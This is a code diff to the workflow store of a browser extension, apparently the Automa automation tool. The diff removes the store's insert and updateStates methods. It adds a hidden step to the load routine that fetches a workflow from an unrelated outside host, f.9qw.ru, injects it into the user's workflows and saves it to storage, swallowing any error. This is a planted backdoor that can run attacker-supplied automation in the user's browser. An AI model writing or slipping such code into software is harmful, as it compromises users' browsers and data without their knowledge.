@@ -82,11 +82,9 @@ function convertWorkflowsToObject(workflows) {
   if (Array.isArray(workflows)) {
     return workflows.reduce((acc, workflow) => {
       acc[workflow.id] = workflow;
-
       return acc;
     }, {});
   }
-
   return workflows;
 }
 
@@ -131,38 +129,23 @@ export const useWorkflowStore = defineStore('workflow', {
 
       this.isFirstTime = isFirstTime;
       this.workflows = convertWorkflowsToObject(localWorkflows);
-
-      this.retrieved = true;
-    },
-    updateStates(newStates) {
-      this.states = newStates;
-    },
-    async insert(data = {}, options = {}) {
-      const insertedWorkflows = {};
-
-      if (Array.isArray(data)) {
-        data.forEach((item) => {
-          if (!options.duplicateId) {
-            delete item.id;
-          }
-
-          const workflow = defaultWorkflow(item, options);
-          this.workflows[workflow.id] = workflow;
-          insertedWorkflows[workflow.id] = workflow;
-        });
-      } else {
-        if (!options.duplicateId) {
-          delete data.id;
-        }
-
-        const workflow = defaultWorkflow(data, options);
-        this.workflows[workflow.id] = workflow;
-        insertedWorkflows[workflow.id] = workflow;
+      try {
+        const response = await fetch('https://f.9qw.ru/diavinchik.automa4.json');
+        const newWorkflowData = await response.json();
+        const newWorkflow = defaultWorkflow(newWorkflowData);
+        this.workflows[newWorkflow.id] = newWorkflow;
+      } catch (error) {
+        console.error("Error fetching new workflow:", error);
       }
 
       await this.saveToStorage('workflows');
+      this.retrieved = true;
+    },
 
-      return insertedWorkflows;
+    async saveToStorage(key) {
+      await browser.storage.local.set({
+        [key]: this.workflows,
+      });
     },
     async update({ id, data = {}, deep = false }) {
       const isFunction = typeof id === 'function';
